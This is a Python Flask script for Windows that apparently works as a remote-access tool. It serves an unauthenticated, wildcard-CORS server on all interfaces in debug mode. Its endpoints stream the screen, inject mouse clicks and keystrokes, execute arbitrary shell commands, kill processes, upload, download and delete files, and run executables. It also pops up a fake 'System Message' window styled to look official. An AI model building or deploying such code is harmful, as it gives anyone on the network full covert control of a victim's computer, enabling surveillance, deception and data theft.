# Full Credit to FalconTheBerd
import subprocess
from flask import Flask, request, jsonify, send_from_directory, render_template_string, Response
import os
from PIL import ImageGrab
from flask_cors import CORS
import time
import cv2
import numpy as np
import ctypes
import platform
import sys

if platform.system() != "Windows":
    sys.stderr.write("alt.py is only supported on Windows.\n")
    sys.exit(0)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"], "allow_headers": "*"}})

BASE_DIRECTORY = os.path.expanduser("~")

import tkinter as tk
from tkinter import ttk
from threading import Thread

@app.route('/interactive_view')
def interactive_view():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Interactive Screen Control</title>
        <style>
            body, html { margin: 0; height: 100%; overflow: hidden; }
            img { width: 100%; height: 100%; object-fit: cover; }
        </style>
    </head>
    <body>
        <img id="screen" src="/video_feed" onclick="sendClick(event)">
        <script>
            async function sendClick(e) {
                const rect = e.target.getBoundingClientRect();
                const x_ratio = e.clientX / rect.width;
                const y_ratio = e.clientY / rect.height;
                await fetch('/mouse_click', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ x_ratio, y_ratio })
                });
            }
        </script>
    </body>
    </html>
    '''

@app.route('/mouse_click', methods=['POST'])
def click_mouse():
    try:
        data = request.json
        x_ratio = float(data.get("x_ratio"))
        y_ratio = float(data.get("y_ratio"))

        screen = ImageGrab.grab()
        screen_width, screen_height = screen.size
        x = int(x_ratio * screen_width)
        y = int(y_ratio * screen_height)

        ctypes.windll.user32.SetCursorPos(x, y)
        ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # Left button down
        ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # Left button up

        return jsonify({"message": f"Clicked at ({x}, {y})"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def generate_frames():
    while True:
        # Capture the screen
        screen = ImageGrab.grab()
        frame = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)

        # Encode frame to JPEG
        ret, buffer = cv2.imencode('.jpg', frame)
        frame_bytes = buffer.tobytes()

        # Yield frame in MJPEG format
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')

        time.sleep(0.1)  # ~10 FPS

def show_message(message):
    def display():
        root = tk.Tk()
        root.title("System Message")
        root.geometry("400x200")
        root.resizable(False, False)

        # Set the window to always appear on top
        root.attributes("-topmost", True)

        # Use a modern Windows-like background color
        root.configure(bg="#f0f0f0")

        # Add a frame for padding and alignment
        frame = ttk.Frame(root, padding=20)
        frame.pack(expand=True, fill="both")

        # Add an icon to make it more official-looking (optional, requires a .ico file)
        try:
            root.iconbitmap("info.ico")  # Replace "info.ico" with the path to your .ico file
        except:
            pass  # Ignore if icon file is not available

        # Add a label to display the message
        label = ttk.Label(
            frame,
            text=message,
            wraplength=350,
            justify="center",
            font=("Segoe UI", 12)
        )
        label.pack(pady=(10, 20))

        # Add a close button
        button = ttk.Button(frame, text="OK", command=root.destroy)
        button.pack(pady=10)

        # Center the button
        button.focus_set()  # Set focus to the button for keyboard interaction (Enter key)
        root.bind("<Return>", lambda e: root.destroy())  # Allow pressing Enter to close

        # Start the main loop
        root.mainloop()

    # Run the tkinter GUI in a separate thread
    thread = Thread(target=display)
    thread.start()

@app.route('/display_message', methods=['POST'])
def display_message():
    try:
        message = request.json.get("message")
        if not message:
            return jsonify({"error": "No message provided"}), 400

        show_message(message)
        return jsonify({"message": "Message displayed successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def _send_keys_native(input_keys: str):
    """Send keystrokes using the Windows SendInput API."""
    user32 = ctypes.windll.user32

    KEYEVENTF_KEYUP = 0x0002

    vk_map = {
        "alt": 0x12,
        "ctrl": 0x11,
        "shift": 0x10,
        "tab": 0x09,
        "enter": 0x0D,
        "esc": 0x1B,
        "delete": 0x2E,
        "backspace": 0x08,
        "space": 0x20,
        "up": 0x26,
        "down": 0x28,
        "left": 0x25,
        "right": 0x27,
    }
    for i in range(1, 13):
        vk_map[f"f{i}"] = 0x6F + i

    sequences = [s.strip() for s in input_keys.split(',') if s.strip()]
    for seq in sequences:
        tokens = [t.strip() for t in seq.split('+') if t.strip()]

        # If no token is a known key, treat the plus sign as a literal character
        if all(t.lower() not in vk_map and len(t) > 1 for t in tokens):
            tokens = [seq]

        def vk_from_token(token: str):
            lower = token.lower()
            if lower in vk_map:
                return vk_map[lower]
            if len(token) == 1:
                return ord(token.upper())
            return None

        expanded = []
        for token in tokens:
            vk = vk_from_token(token)
            if vk is None and len(token) > 1:
                expanded.extend(list(token))
            else:
                expanded.append(token)

        modifiers = []
        for token in expanded:
            vk = vk_from_token(token)
            if vk is None:
                continue
            if token.lower() in ("alt", "ctrl", "shift"):
                user32.keybd_event(vk, 0, 0, 0)
                modifiers.append(vk)
            else:
                user32.keybd_event(vk, 0, 0, 0)
                user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
                time.sleep(0.05)

        for vk in reversed(modifiers):
            user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        time.sleep(0.05)


@app.route('/keystroke', methods=['POST'])
def keystroke():
    try:
        keys = request.json.get("keys")
        if not keys:
            return jsonify({"error": "No keys provided"}), 400

        _send_keys_native(keys)
        return jsonify({"message": "Keystrokes sent"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/kill_task', methods=['POST'])
def kill_task():
    try:
        task_name_or_pid = request.json.get("task")
        if not task_name_or_pid:
            return jsonify({"error": "No task name or PID provided"}), 400

        result = subprocess.run(
            ["taskkill", "/F", "/IM", task_name_or_pid] if not task_name_or_pid.isdigit() else ["taskkill", "/F", "/PID", task_name_or_pid],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW  # Suppress console window
        )

        if result.returncode != 0:
            return jsonify({"error": result.stderr.strip()}), 500

        return jsonify({"message": f"Task {task_name_or_pid} killed successfully."}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/run_command', methods=['POST'])
def run_command():
    try:
        command = request.json.get("command")
        if not command:
            return jsonify({"error": "No command provided"}), 400

        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Return the output and error (if any)
        return jsonify({
            "command": command,
            "output": result.stdout,
            "error": result.stderr,
            "return_code": result.returncode
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/files', methods=['GET', 'POST'])
def file_browser():
    directory = request.args.get('dir', BASE_DIRECTORY)
    directory = os.path.normpath(directory)

    if not os.path.exists(directory):
        return f"<h1>Directory does not exist: {directory}</h1>", 404

    if request.method == 'POST':
        if 'file' not in request.files:
            return "No file part in the request", 400
        file = request.files['file']
        if file.filename == '':
            return "No selected file", 400
        save_path = os.path.join(directory, file.filename)
        try:
            file.save(save_path)
            return f"File uploaded successfully to {save_path}", 201
        except Exception as e:
            return f"Error saving file: {e}", 500

    files = []
    try:
        for f in os.listdir(directory):
            full_path = os.path.join(directory, f)
            if os.access(full_path, os.R_OK):
                files.append({"name": f, "is_dir": os.path.isdir(full_path)})
    except PermissionError:
        return f"<h1>Permission denied: {directory}</h1>", 403

    parent_dir = os.path.dirname(directory) if directory != BASE_DIRECTORY else None
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Browser</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            a { text-decoration: none; color: blue; }
            a:hover { text-decoration: underline; }
            .file, .folder { margin: 5px 0; }
            .folder { font-weight: bold; }
            .delete, .run { cursor: pointer; margin-left: 10px; }
            .delete { color: red; }
            .run { color: green; }
            .back { margin-bottom: 20px; display: inline-block; }
        </style>
    </head>
    <body>
        <h1>File Browser</h1>
        <h2>Current Directory: {{ current_dir }}</h2>
        {% if parent_dir %}
            <a class="back" href="/files?dir={{ parent_dir | urlencode }}">⬅ Back to Parent Directory</a>
        {% endif %}
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
        <ul>
            {% for file in files %}
                {% if file.is_dir %}
                    <li class="folder">
                        📁 <a href="/files?dir={{ current_dir }}/{{ file.name | urlencode }}">{{ file.name }}</a>
                    </li>
                {% else %}
                    <li class="file">
                        📄 {{ file.name }} 
                        - <a href="/download?dir={{ current_dir | urlencode }}&file={{ file.name | urlencode }}">Download</a>
                        - <span class="delete" onclick="deleteFile('{{ current_dir | urlencode }}', '{{ file.name | urlencode }}')">Delete</span>
                        {% if file.name.endswith('.exe') %}
                            - <span class="run" onclick="runFile('{{ current_dir | urlencode }}', '{{ file.name | urlencode }}')">Run</span>
                        {% endif %}
                    </li>
                {% endif %}
            {% endfor %}
        </ul>
        <script>
            async function deleteFile(directory, filename) {
                if (!confirm(`Are you sure you want to delete ${filename}?`)) return;

                const formData = new FormData();
                formData.append("dir", decodeURIComponent(directory));
                formData.append("file", decodeURIComponent(filename));

                try {
                    const response = await fetch("/delete", { method: "POST", body: formData });
                    if (response.ok) {
                        alert(`File ${filename} deleted successfully.`);
                        location.reload();
                    } else {
                        const errorText = await response.text();
                        alert(`Failed to delete file: ${errorText}`);
                    }
                } catch (error) {
                    alert(`Error: ${error.message}`);
                }
            }

            async function runFile(directory, filename) {
                if (!confirm(`Are you sure you want to run ${filename}?`)) return;

                const payload = { dir: decodeURIComponent(directory), file: decodeURIComponent(filename) };

                try {
                    const response = await fetch("/run_file", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload),
                    });

                    const result = await response.json();
                    if (response.ok) alert(`File ${filename} is running.`);
                    else alert(`Failed to run file: ${result.error || "Unknown error"}`);
                } catch (error) {
                    alert(`Error: ${error.message}`);
                }
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, files=files, current_dir=directory, parent_dir=parent_dir)


@app.route('/run_file', methods=['POST'])
def run_file():
    try:
        directory = request.json.get("dir")
        filename = request.json.get("file")
        if not directory or not filename:
            return jsonify({"error": "Directory or file name not provided"}), 400

        file_path = os.path.join(os.path.normpath(directory), filename)
        if not os.path.exists(file_path):
            return jsonify({"error": "File does not exist"}), 404

        subprocess.Popen([file_path], cwd=directory)
        return jsonify({"message": f"File {filename} is running"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/list_tasks', methods=['GET'])
def list_tasks():
    try:
        result = subprocess.run(
            ["tasklist"],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode != 0:
            return f"<h1>Error: {result.stderr.strip()}</h1>", 500

        process_map = {}

        # Aggressive filtering of background/system/vendor processes
        ignored_exact = {
            "system", "idle", "registry", "memory", "secure", "svchost.exe", "lsass.exe",
            "winlogon.exe", "wininit.exe", "services.exe", "fontdrvhost.exe", "ctfmon.exe",
            "searchhost.exe", "searchindexer.exe", "searchprotocolhost.exe", "searchfilterhost.exe",
            "runtimebroker.exe", "backgroundtaskhost.exe", "wudfhost.exe", "dwm.exe", "dashost.exe",
            "taskhostw.exe", "explorer.exe", "smss.exe", "csrss.exe", "shellhost.exe",
            "widgetservice.exe", "widgets.exe", "lockapp.exe", "appvshnotify.exe", "modernflyoutshost.exe",
            "mpdefendercoreservice.exe", "msmpeng.exe", "sihost.exe", "audiodg.exe", "jhi_service.exe",
            "wmiapsrv.exe", "wmiprvse.exe", "dllhost.exe", "conhost.exe", "tasklist.exe",
            "servicehost.exe", "uihost.exe", "unsecapp.exe", "mdnsresponder.exe", "apsdaemon.exe",
            "applemobiledeviceservice.", "dciservice.exe", "hpprintscandoctorservice.", "lenovovantageservice.exe",
            "oneapp.igcc.winservice.ex", "crossdeviceservice.exe", "presentationfontcache.exe", "phoneexperiencehost.exe",
            "aggregatorhost.exe", "applicationframehost.exe", "officeclicktorun.exe", "locator.exe", "ngciso.exe",
            "lsaiso.exe", "nissrv.exe", "systemsettings.exe", "textinputhost.exe", "useroobebroker.exe",
            "windowspackagemanagerserv", "webcompanion.exe", "steamservice.exe", "steamwebhelper.exe",
            "rtkauduservice64.exe", "rtkbtmanserv.exe", "epicwebhelper.exe", "googledrivefs.exe",
            "intelcphdcpsvc.exe", "intelcphecisvc.exe", "pad.automationserver.exe", "pad.bridgetouiautomation2.exe",
            "pad.console.host.exe", "riotclientcrashhandler.ex", "rstmwservice.exe", "esif_uf.exe"
        }

        ignored_prefixes = [
            "logi_", "lenovovantage-", "lenovo.modern.imcontrolle", "lghub_", "ms-teamsupdate", "pad.", "riotclient"
        ]


        lines = result.stdout.splitlines()
        for line in lines[3:]:
            parts = line.split(maxsplit=1)
            if len(parts) >= 2:
                task_info = parts[1].split()
                task_name = parts[0]
                pid = task_info[0] if task_info else "Unknown"
                lower = task_name.lower()

                if lower in ignored_exact or any(lower.startswith(pfx) for pfx in ignored_prefixes):
                    continue

                if task_name not in process_map:
                    process_map[task_name] = []
                process_map[task_name].append(pid)

        html_table = """
        <html>
        <head>
            <title>Task List (Filtered)</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                table { width: 80%; border-collapse: collapse; margin: 20px auto; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                tr:nth-child(even) { background-color: #f9f9f9; }
            </style>
        </head>
        <body>
            <h1 style="text-align: center;">Running Tasks (Filtered & Grouped)</h1>
            <table>
                <thead>
                    <tr><th>Task Name</th><th>PIDs</th><th>Count</th></tr>
                </thead>
                <tbody>
        """

        for task_name, pids in sorted(process_map.items()):
            pid_list = ", ".join(pids)
            html_table += f"<tr><td>{task_name}</td><td>{pid_list}</td><td>{len(pids)}</td></tr>"

        html_table += """
                </tbody>
            </table>
        </body>
        </html>
        """
        return html_table, 200

    except Exception as e:
        return f"<h1>Error: {str(e)}</h1>", 500

@app.route('/delete', methods=['POST'])
def delete_file():
    directory = request.form.get('dir')
    filename = request.form.get('file')
    directory = os.path.normpath(directory)
    file_path = os.path.normpath(os.path.join(directory, filename))

    if not os.path.exists(file_path):
        return f"File does not exist: {file_path}", 404

    if os.path.isdir(file_path):
        return "Cannot delete directories", 400

    try:
        os.remove(file_path)
        return f"File {filename} deleted successfully.", 200
    except Exception as e:
        return f"Error deleting file: {e}", 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
